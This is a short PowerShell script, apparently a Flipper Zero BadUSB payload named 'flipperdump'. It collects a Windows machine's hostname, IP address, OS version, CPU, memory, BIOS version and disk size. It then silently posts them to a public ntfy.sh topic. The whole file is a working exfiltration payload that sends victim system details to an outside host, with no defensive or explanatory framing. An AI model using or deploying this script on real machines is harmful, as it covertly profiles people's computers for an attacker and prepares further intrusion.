$topic = 'flipperdump'
$hostname = $env:COMPUTERNAME
$ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' }).IPAddress
$osVersion = (Get-CimInstance Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance Win32_OperatingSystem).Version
$cpu = (Get-CimInstance Win32_Processor).Name
$memory = [math]::round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$bios = (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion
$diskSize = [math]::round((Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }).Size / 1GB, 2)
$message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion`nCPU: $cpu`nMemory: $memory GB`nBIOS: $bios`nDisk Size: $diskSize GB"
$url = 'https://ntfy.sh/' + $topic
Invoke-RestMethod -Method Post -Uri $url -Body $message
